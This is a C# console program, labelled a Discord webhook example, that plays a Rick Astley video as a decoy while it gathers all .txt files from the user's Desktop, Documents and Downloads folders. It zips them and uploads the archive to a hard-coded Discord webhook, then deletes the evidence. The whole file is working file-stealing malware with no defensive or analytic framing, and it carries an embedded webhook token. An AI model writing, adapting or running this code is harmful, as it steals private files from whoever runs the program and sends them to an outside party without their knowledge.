using System;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Net.Http;
using System.Threading.Tasks;

namespace DiscordWebhookExample
{
    class Program
    {

        static async Task Main(string[] args)
        {

            var url = "https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstley";
            Process.Start(new ProcessStartInfo("cmd", $"/c start {url}")
            {
                CreateNoWindow = true
            });

                
                


            var webhookUrl = "https://discord.com/api/webhooks/1090758743119101982/fIeECkneG8-EJ6Acxq0dabgsQyrQLKsOxI6N-O0F7XaXlYyEiJQMu2lsaf8ve_Xfw8Y0";
            var client = new HttpClient();

            var desktopDir = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            var documentDir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            var downloadDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\Downloads";

            var txtFiles = GetTxtFiles(desktopDir).Concat(GetTxtFiles(documentDir)).Concat(GetTxtFiles(downloadDir)).ToArray();

            // Create a temporary zip file in the user's temp folder
            var tempZipFilePath = Path.Combine(Path.GetTempPath(), "downloaded_files.zip");
            if (!Directory.Exists(tempZipFilePath))
            {
                File.Delete(tempZipFilePath);
            }

            // Zip all the text files in the specified directories into the temporary zip file
            using (var archive = ZipFile.Open(tempZipFilePath, ZipArchiveMode.Create))
            {
                foreach (var file in txtFiles)
                {
                    var fileName = Path.GetFileName(file);
                    archive.CreateEntryFromFile(file, fileName);
                }
            }
            var httpClient = new HttpClient();
            httpClient.Timeout = TimeSpan.FromMinutes(5); // set the timeout value to 5 minutes


            // Send the zip file to the Discord webhook
            using (var fileStream = File.OpenRead(tempZipFilePath))
            {
                var fileName = Path.GetFileName(tempZipFilePath);

                var messageContent = new StringContent($"New zip file received: {fileName}");
                var multipartMessage = new MultipartFormDataContent();
                multipartMessage.Add(messageContent, "content");

                var fileContent = new StreamContent(fileStream);
                fileContent.Headers.ContentDisposition = new System.Net.Http.Headers.ContentDispositionHeaderValue("form-data")
                {
                    Name = "file",
                    FileName = fileName
                };
                var multipartFile = new MultipartFormDataContent();
                multipartFile.Add(fileContent);

                var response = await client.PostAsync(webhookUrl, multipartMessage);
                response.EnsureSuccessStatusCode();

                response = await client.PostAsync(webhookUrl, multipartFile);
                response.EnsureSuccessStatusCode();
            }

            // Delete the temporary zip file
            File.Delete(tempZipFilePath);

            Console.WriteLine("All .txt files in specified directories zipped and sent to Discord webhook!");
            Console.ReadKey();
        }

        static string[] GetTxtFiles(string directory)
        {
            return Directory.GetFiles(directory, "*.txt", SearchOption.AllDirectories);
        }
    }
}
